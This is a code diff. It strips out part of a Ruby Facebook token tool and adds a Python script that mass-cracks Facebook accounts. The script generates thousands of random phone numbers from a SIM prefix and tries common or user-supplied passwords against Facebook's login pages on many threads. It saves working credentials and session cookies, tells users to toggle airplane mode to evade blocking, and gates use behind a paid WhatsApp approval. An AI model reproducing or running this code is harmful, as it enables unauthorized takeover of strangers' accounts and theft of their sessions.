-          puts ("#{$w}[#{$g}✓#{$w}] Page Name : #{i['name']}")
-          puts ("#{$w}[#{$g}✓#{$w}] Page Id : #{i['id']}")
-          puts ("#{$w}[#{$g}✓#{$w}] Access Token : #{i['access_token']}\n\n")
-        end
-        print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-        PageMenu()
-      end
-    when '0'
-      lain()
-    else
-      puts ("#{$y}[!] Invalid Input")
-      sleep(0.9)
-      PageMenu()
-  end
-end
-  
 
-if __FILE__ == $0
-  system("printf \"\033]0;Facebook\007\"")
-  Masuk()
-end
+
+
+#_______
+
+def malik_baloch():
+	user=[]
+	os.system('clear')
+	print(logo)
+	print('[√] EXAMPLE :92318,92345,92323,92306.ETC')
+	lines()
+	kode = input('[+]\033[1;37m PUT YOUR SIM CODE : ')
+	os.system('clear')
+	print(logo)
+	print('[•] MAX LIMIT [50000]')
+	lines()
+	limit = int(input('[•] ENTER LIMIT :  '))
+	for nmbr in range(limit):
+		nmp = ''.join(random.choice(string.digits) for _ in range(7))
+		user.append(nmp)
+	with ThreadPool(max_workers=60) as yaari:
+		os.system('clear')
+		print(logo)
+		tl = str(len(user))
+		print('[•] TOTAL ACCOUNTS    : \033[1;32m'+tl)
+		print('\033[1;37m[•] SELECTED CODE     : \033[1;32m'+kode)
+		print('\033[1;37m[•] METHOD YOU CHOOSE : \033[1;32mMALIK + BALOCH')
+		print('\x1b[1;97m[•] USE FLIGHT [\033[1;32mAIRPLANE\033[1;37m] MODE IN EVERY 5 MINUTES')
+		lines()
+		for guru in user:
+			uid = kode+guru
+			pwx = [guru,'malik123','malik1122','baloch786']
+			yaari.submit(fcrack,uid,pwx,tl)
+	print('[✓] Crack process has been completed')
+	print('[?] Ids saved in ok.txt,cp.txt')
+	input('Press Inter To Back Menu')
+	rehan()
+
+#____
+
+def pubg():
+	user=[]
+	os.system('clear')
+	print(logo)
+	print('[√] EXAMPLE :92318,92345,92323,92306.ETC')
+	lines()
+	kode = input('[+]\033[1;37m PUT YOUR SIM CODE : ')
+	os.system('clear')
+	print(logo)
+	print('[•] MAX LIMIT [50000]')
+	lines()
+	limit = int(input('[•] ENTER LIMIT :  '))
+	for nmbr in range(limit):
+		nmp = ''.join(random.choice(string.digits) for _ in range(7))
+		user.append(nmp)
+	with ThreadPool(max_workers=30) as yaari:
+		os.system('clear')
+		print(logo)
+		tl = str(len(user))
+		print('[•] TOTAL ACCOUNTS    : \033[1;32m'+tl)
+		print('\033[1;37m[•] SELECTED CODE     : \033[1;32m'+kode)
+		print('\033[1;37m[•] METHOD YOU CHOOSE : \033[1;32mPUBG')
+		print('\x1b[1;97m[•] USE FLIGHT [\033[1;32mAIRPLANE\033[1;37m] MODE IN EVERY 5 MINUTES')
+		lines()
+		for guru in user:
+			uid = kode+guru
+			pwx = [guru,'pubgqueen','pubgking','pubglover']
+			yaari.submit(fcrack,uid,pwx,tl)
+	print('[✓] Crack process has been completed')
+	print('[?] Idz saved in [ok.txt,cp.txt]')
+	input('Press Enter To Go Back To Menu')
+	rehan()
+
+#____
+
+def ff():
+	user=[]
+	os.system('clear')
+	print(logo)
+	print('[√] EXAMPLE :92318,92345,92323,92306.ETC')
+	lines()
+	kode = input('[+]\033[1;37m PUT YOUR SIM CODE : ')
+	os.system('clear')
+	print(logo)
+	print('[•] MAX LIMIT [50000]')
+	lines()
+	limit = int(input('[•] ENTER LIMIT :  '))
+	for nmbr in range(limit):
+		nmp = ''.join(random.choice(string.digits) for _ in range(7))
+		user.append(nmp)
+	with ThreadPool(max_workers=30) as yaari:
+		os.system('clear')
+		print(logo)
+		tl = str(len(user))
+		print('[•] TOTAL ACCOUNTS    : \033[1;32m'+tl)
+		print('\033[1;37m[•] SELECTED CODE     : \033[1;32m'+kode)
+		print('\033[1;37m[•] METHOD YOU CHOOSE : \033[1;32mFREE FIRE')
+		print('\x1b[1;97m[•] USE FLIGHT [\033[1;32mAIRPLANE\033[1;37m] MODE IN EVERY 5 MINUTES')
+		lines()
+		for guru in user:
+			uid = kode+guru
+			pwx = [guru,'freefire','fflover','ffking','ffqueen']
+			yaari.submit(fcrack,uid,pwx,tl)
+	print('[✓] Crack process has been completed')
+	print('[?] Idz saved in [ok.txt,cp.txt]')
+	input('Press Enter To Go Back To Menu')
+	rehan()
+
+#___________
+
+def bd():
+	user=[]
+	os.system('clear')
+	print(logo)
+	print('[•] EXAMPLE : 088***,88***,88****,88****,.ETC')
+	lines()
+	kode = input('[•]\033[1;37m PUT YOUR SIM CODE : ')
+	os.system('clear')
+	print(logo)
+	print('[•] MAX LIMIT [50000]')
+	lines()
+	limit = int(input('[•] ENTER LIMIT :  '))
+	for nmbr in range(limit):
+		nmp = ''.join(random.choice(string.digits) for _ in range(7))
+		user.append(nmp)
+	with ThreadPool(max_workers=70) as yaari:
+		os.system('clear')
+		print(logo)
+		tl = str(len(user))
+		print('[•] TOTAL ACCOUNTS    : \033[1;32m'+tl)
+		print('\033[1;37m[•] SELECTED CODE     : \033[1;32m'+kode)
+		print('\033[1;37m[•] METHOD YOU CHOOSE : \033[1;32mBANGLA')
+		print('\x1b[1;97m[•] USE FLIGHT [\033[1;32mAIRPLANE\033[1;37m] MODE IN EVERY 5 MINUTES')
+		lines()
+		for guru in user:
+			uid = kode+guru
+			pwx = [guru,'+88','bangladish']
+			yaari.submit(fcrack,uid,pwx,tl)
+	print('[✓] Crack process has been completed')
+	print('[?] Ids saved in ok.txt,cp.txt')
+	input('Press Inter To Back Menu')
+	rehan()
+
+def chos():
+    user=[]
+    twf =[]
+    os.getuid
+    os.geteuid
+    os.system("clear")
+    print(logo)
+    print('\x1b[1;91m[•] YOUR SIM CODE: ')
+    lines()
+    code = input(' Your Code : ')
+    lines()
+    os.system('clear')
+    print(logo)
+    print('[•] MAX LIMIT [50000]')
+    lines()
+    limit = int(input('[•] LIMIT :  '))
+    for nmbr in range(limit):
+        nmp = ''.join(random.choice(string.digits) for _ in range(7))
+        user.append(nmp)
+    os.system("clear")
+    print(logo)
+    print('[•] EXAMPLE :  1,2,3,4,5,6,7,8,9,Etc')
+    lines()
+    passx = int(input("[•] ENTER PASSWORD LIMIT : "))
+    HamiiID = []
+    os.system('clear')
+    print(logo)
+    print('[•] EXAMPLE : khan12345,bangladish,baloch,Etc')
+    lines()
+    for bilal in range(passx):
+        pww = input(f"[•] ENTER PASSWORDS {bilal+1} : ")
+        HamiiID.append(pww)
+    with ThreadPool(max_workers=70) as manshera:
+        os.system('clear')
+        print(logo)
+        tl = str(len(user))
+        lines()
+        for love in user:
+            pwx = [love[1:]]
+            uid = code+love
+            for Eman in HamiiID:
+                pwx.append(Eman)
+                pwx.append(love)
+            manshera.submit(fcrack,uid,pwx,tl)
+    print('Crack process has been completed')
+    print('Ids saved in ok.txt,cp.txt')
+    rehan()
+#_____
+def fcrack(uid,pwx,tl):
+    #print(user)
+    global loop
+    global cps
+    global oks
+    global proxy
+    
+    try:
+        for ps in pwx:
+            pro = random.choice(ugen)
+            session = requests.Session()
+            free_fb = session.get('https://x.facebook.com').text
+            log_data = {
+                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
+            "try_number":"0",
+            "unrecognized_tries":"0",
+            "email":uid,
+            "pass":ps,
+            "login":"Log In"}
+            headers = { 'authority': 'mbasic.facebook.com',
+             'method': 'GET',
+              'path': '/',
+              'scheme': 'https',
+              'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+              'accept-language': 'en-US,en;q=0.9',
+              'cache-control': 'max-age=0',    
+              'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
+              'sec-ch-ua-mobile': '?1',
+              'sec-ch-ua-platform': '"Android"',
+              'sec-fetch-dest': 'document',
+              'sec-fetch-mode': 'navigate',
+              'sec-fetch-site': 'none',
+              'sec-fetch-user': '?1',
+              'upgrade-insecure-requests': '1',
+              'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',}
+            response = requests.get('https://mbasic.facebook.com/', cookies=cookies, headers=headers)
+            log_cookies=session.cookies.get_dict().keys()
+            #print(iid+'|'+pws+'|'+str(log_cookies))
+            if 'c_user' in log_cookies:
+                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                cid = coki[151:166]
+                print('\033[1;32m[AYAN-OK] '+cid+'|'+ps+'\033[0;97m\n[‎‎🍁]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
+                open('RDX-OK.txt', 'a').write(cid+' | '+ps+ '\n')
+                oks.append(cid)
+                break
+            elif 'checkpoint' in log_cookies:
+                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                cid = coki[141:152]
+                # print('\033[1;33m[AYAN-CP] '+uid+' | '+ps+'\x1b[1;97m')
+                open('AYAN-CP.txt', 'a').write(uid+' | '+ps+'\n')
+                cps.append(cid)
+                break
+            else:
+                continue
+        loop+=1
+        sys.stdout.write(f'\r[\033[1;97mAYAN🧐\033[1;97m] %s|\33[1;32mOK:- %s\r'%(loop,len(oks))),
+        sys.stdout.flush()
+    except:
+        pass
+        
+def approval():
+  os.system('clear')
+  print(logo)
+  uuid = str(os.geteuid()) + str(os.getlogin())
+  id = "-".join(uuid)
+
+  try:
+    httpCaht = requests.get('https://raw.githubusercontent.com/REHAN-XD/TEST/main/Approval.txt').text
+    if id in httpCaht:
+      print("\33[1;32mYOUR KEY IS APPROVED.")
+      msg = str(os.geteuid())
+      time.sleep(0.5)
+      rehan()
+      pass
+    else:
+      print("YOUR KEY : "+id)
+      print('\33[1;37m----------------------------------------------')
+      print("\33[1;32mNOTE:")
+      print("\33[1;37m----------------------------------------------")
+      print("\33[1;37mTOOL IS FREE BUT YOU HAVE TO\nGET APPROVAL FIRST.")
+      print('\33[1;37m----------------------------------------------')
+      print ('IF U DONT WANT TO BUY PLS DONT PRESS ENTER')
+      input('IF U WANT TO BUY THEN PRESS ENTER ')
+      tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+id);os.system('am start https://wa.me/+971564382087?text='+tks),approval()
+      time.sleep(1)
+      approval()
+  except:
+    sys.exit()
+
+rehan()
